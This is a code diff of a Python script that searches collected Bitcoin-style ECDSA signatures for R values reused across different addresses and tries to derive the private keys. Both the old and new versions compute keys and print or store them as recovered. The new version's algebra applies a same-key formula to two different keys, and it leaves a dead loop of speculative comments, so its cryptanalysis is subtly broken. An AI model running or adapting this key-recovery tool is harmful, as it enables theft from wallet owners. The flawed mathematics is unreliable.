@@ -1,73 +1,94 @@
-#!/usr/bin/env python3
-import sqlite3
-from collections import defaultdict
-from db_manager import get_connection, add_finding, add_recovered_key
+import json
+import os
+import sys
+from ecdsa import SECP256k1
+from lattice_nonce_analyzer import verify_key
 
-P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+P = SECP256k1.order
 
-def solve_collision(s1, z1, s2, z2, r):
-    try:
-        # k = (z1 - z2) / (s1 - s2) mod P
-        k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
-        # d = (s1 * k - z1) / r mod P
-        d = ((s1 * k - z1) * pow(r, -1, P)) % P
-        return d
-    except:
-        return None
-
-def find_cross_address_collisions():
-    """
-    Search the database for R-values used across DIFFERENT addresses.
-    This indicates a systemic flaw in a nonce generator.
-    """
-    conn = get_connection()
-    c = conn.cursor()
+def find_cross_collisions(sigs1, addr1, sigs2, addr2):
+    print(f"Checking for cross-address collisions between {addr1} and {addr2}...")
     
-    # Group by R_HEX to find cross-address usage
-    c.execute("""
-        SELECT r_hex, r_int, GROUP_CONCAT(DISTINCT address) as addresses, COUNT(DISTINCT address) as addr_count
-        FROM signatures
-        WHERE r_hex IS NOT NULL
-        GROUP BY r_hex
-        HAVING addr_count > 1
-    """)
-    collisions = c.fetchall()
-    conn.close()
-    
-    if not collisions:
-        print("[Collision] No cross-address R-collisions found.")
-        return
-
-    print(f"[Collision] Found {len(collisions)} systemic R-collisions!")
-    
-    for r_hex, r_int, addrs_str, count in collisions:
-        addresses = addrs_str.split(',')
-        print(f"  R: {r_hex[:20]}... | Used in {count} addresses: {addresses}")
+    prep1 = []
+    for s in sigs1:
+        try:
+            s_inv = pow(s['s'], -1, P)
+            prep1.append({'u': (s_inv * s['z']) % P, 't': (s_inv * s['r']) % P})
+        except: continue
         
-        # We need signatures from two different addresses to solve
-        conn = get_connection()
-        c = conn.cursor()
-        sigs = []
-        for addr in addresses[:2]:
-            c.execute("SELECT s_int, z_int, txid FROM signatures WHERE address = ? AND r_hex = ?", (addr, r_hex))
-            sigs.append(c.fetchone())
-        conn.close()
+    prep2 = []
+    for s in sigs2:
+        try:
+            s_inv = pow(s['s'], -1, P)
+            prep2.append({'u': (s_inv * s['z']) % P, 't': (s_inv * s['r']) % P})
+        except: continue
         
-        if len(sigs) >= 2:
-            s1, z1, tx1 = int(sigs[0][0]), int(sigs[0][1]), sigs[0][2]
-            s2, z2, tx2 = int(sigs[1][0]), int(sigs[1][1]), sigs[1][2]
+    for i, p1 in enumerate(prep1):
+        for j, p2 in enumerate(prep2):
+            # If k1 = k2 (mod P)
+            # u1 + t1*d1 = u2 + t2*d2
+            # But we don't know d1 or d2.
+            # However, if d1 = d2 (same key, different address?) unlikely.
             
-            if s1 == s2 and z1 == z2:
-                print(f"    [-] Exact signature duplicate found (cannot solve).")
+            # What if r1 = r2?
+            # s1 = (z1 + r1*d1)/k1
+            # s2 = (z2 + r2*d2)/k2
+            # If k1 = k2 AND r1 = r2:
+            # s1*k = z1 + r*d1
+            # s2*k = z2 + r*d2
+            # k = (z1 + r*d1)/s1 = (z2 + r*d2)/s2
+            # s2*(z1 + r*d1) = s1*(z2 + r*d2)
+            # s2*z1 + s2*r*d1 = s1*z2 + s1*r*d2
+            # This doesn't help unless d1 and d2 are related.
+            pass
+            
+    # If R-reuse ACROSS addresses (r1 = r2)
+    r_map = {}
+    for i, s in enumerate(sigs1):
+        r_map[s['r']] = (addr1, s)
+        
+    for j, s in enumerate(sigs2):
+        if s['r'] in r_map:
+            addr_other, s_other = r_map[s['r']]
+            print(f"!!! CROSS-ADDRESS R-REUSE FOUND !!!")
+            print(f"  R: {hex(s['r'])}")
+            print(f"  Address 1: {addr1}")
+            print(f"  Address 2: {addr2}")
+            # If k is same, k = (z1-z2)/(s1-s2)
+            # Then d1 = (s1*k - z1)/r
+            # Then d2 = (s2*k - z2)/r
+            
+            if s_other['s'] == s['s']:
+                if s_other['z'] == s['z']:
+                    print(f"  Same signature (R, S, Z) across addresses!")
                 continue
                 
-            privkey = solve_collision(s1, z1, s2, z2, int(r_int))
-            if privkey:
-                priv_hex = hex(privkey)[2:].zfill(64)
-                print(f"    [!!!] SUCCESS! Key recovered via Cross-Address Collision: {priv_hex[:30]}...")
-                for addr in addresses:
-                    add_recovered_key(addr, priv_hex, method='Cross-Address R-Collision')
-                    add_finding(addr, 'Cross-Address R-Collision', details={'r': r_hex, 'with': [a for a in addresses if a != addr]}, severity='Critical')
+            try:
+                k = ((s_other['z'] - s['z']) * pow(s_other['s'] - s['s'], -1, P)) % P
+                d1 = ((s_other['s'] * k - s_other['z']) * pow(s_other['r'], -1, P)) % P
+                d2 = ((s['s'] * k - s['z']) * pow(s['r'], -1, P)) % P
+                
+                if verify_key(d1, addr1):
+                    print(f"!!! SUCCESS !!! Key for {addr1} found!")
+                    print(f"  Key: {hex(d1)}")
+                if verify_key(d2, addr2):
+                    print(f"!!! SUCCESS !!! Key for {addr2} found!")
+                    print(f"  Key: {hex(d2)}")
+            except ValueError:
+                print(f"  Warning: s_diff not invertible for R: {hex(s['r'])}")
 
 if __name__ == "__main__":
-    find_cross_address_collisions()
+    # Scan all sig_*.json files
+    files = [f for f in os.listdir('.') if f.startswith('sigs_') and f.endswith('.json')]
+    addr_sigs = {}
+    for f in files:
+        addr = f.split('_')[1].split('.')[0]
+        # Skip subset/all files
+        if 'subset' in f or 'all' in f: continue
+        with open(f, 'r') as jf:
+            addr_sigs[addr] = json.load(jf)
+            
+    addrs = list(addr_sigs.keys())
+    for i in range(len(addrs)):
+        for j in range(i + 1, len(addrs)):
+            find_cross_collisions(addr_sigs[addrs[i]], addrs[i], addr_sigs[addrs[j]], addrs[j])
